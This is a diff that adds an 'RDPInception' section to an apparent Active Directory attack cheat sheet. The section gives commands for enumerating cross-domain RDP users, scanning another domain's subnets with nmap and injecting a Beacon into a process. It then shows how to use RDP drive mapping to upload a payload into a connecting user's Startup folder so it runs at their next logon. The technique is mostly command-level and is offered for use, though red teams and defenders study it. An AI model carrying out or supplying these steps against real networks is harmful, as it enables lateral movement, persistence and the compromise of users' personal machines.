@@ -68,6 +68,7 @@
   * [Foreign Security Principals](#Foreign-Security-Principals)
   * [ACLs](#ACLs)
   * [Pam Trust](#Pam-Trust)
+  * [RDPInception](#RDPInception)
 
 ## Password not required
 #### Check for users with password not required attribute
@@ -2082,3 +2083,60 @@ Enter-PSSession <IP> -Authentication NegotiateWithImplicitCredential
 ```
 Get-DomainTrust -Filter {(ForestTransitive -eq $True)}
 ```
+ 
+## RDPInception
+#### Get foreign groups
+```
+Get-DomainForeignGroupMember -Domain <DOMAIN>
+```
+ 
+#### Check local groups on machines
+```
+Get-DomainGPOUserLocalGroupMapping -Identity "<GROUP>" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
+Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
+```
+ 
+#### Check logon sessions on the host
+```
+net logons
+```
+
+#### Check network connections and processes
+```
+netstat -anop tcp | findstr 3389
+ps
+```
+
+#### Scan the hosts/subnets in the other doamin
+```
+nmap -p 139,445,3389,5985 <CIDR>
+```
+
+#### Inject in one of the proccesses
+```
+inject <PID> x64 <BEACON>
+```
+
+#### Then move laterally through open ports or query the domain for other privilege escalation methods.
+- SMB, winrm, kerberoasting, as-reproasting, password in description, ACL's etc.
+- Even if user was not a local admin on any system, or if none of the juicy management ports were available, it can still be possible to move laterally via the established RDP channel. This is where the drive sharing comes into play.
+ 
+### Drive mapping
+- When a user enables drive sharing for their RDP session, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto their machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.
+- Works when users from a outbound trust RDP into a computer in the current domain with drive mapping.
+ 
+#### Check the testclient C Drive
+```
+ls \\tsclient\c
+```
+
+#### Go to the startup folder of the user:
+```
+cd \\tsclient\c\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+ 
+#### Upload paylaod
+```
+upload C:\Payloads\pivot.exe
+```
+ 
